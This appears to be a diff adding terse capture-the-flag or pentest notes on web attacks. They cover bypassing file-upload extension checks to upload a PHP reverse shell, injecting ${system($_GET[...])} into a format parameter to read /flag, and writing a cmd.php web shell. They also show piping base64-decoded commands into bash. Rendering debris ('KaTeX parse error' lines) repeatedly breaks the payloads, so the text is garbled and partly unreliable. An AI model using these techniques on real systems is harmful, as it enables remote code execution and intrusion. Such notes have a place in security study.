@@ -1,0 +1,37 @@
+file upload (only extension check)-gain shell
+
+rev.php#a.jpg  keeps it executable other ways are there
+
+https://book.hacktricks.xyz/pentesting-web/file-upload
+
+can do .pdf.php and php.pdf
+
+we can try
+
+/?format=${system($
+
+KaTeX parse error: Expected '}', got 'EOF' at end of input: {system(
+
+KaTeX parse error: Expected '}', got 'EOF' at end of input: {system(
+
+KaTeX parse error: Expected '}', got 'EOF' at end of input: {system(
+
+_GET[1])}&1=cat+/flagW8Mys
+
+if a site is showing a directory in web page like
+
+it is showing ip:7777/main.php   and in the server it has       dir/ : main.php internal.php etc
+
+u can add cmd.php with php code <?php system($_GET\["cmd"\]);?&gt; ..echo &lt;?php system($
+
+KaTeX parse error: Undefined control sequence: \[ at position 5: _GET\̲[̲"cmd"\]);?> …
+
+KaTeX parse error: Undefined control sequence: \[ at position 5: _GET\̲[̲"cmd"\]);?> …
+
+_GET["cmd"]);?> > cmd.php
+
+then from website ip:7777/cmd.php?cmd=id
+
+try cahnging the whole code in base 64 and when uploading
+
+echo <b64>|base64 -d |bash
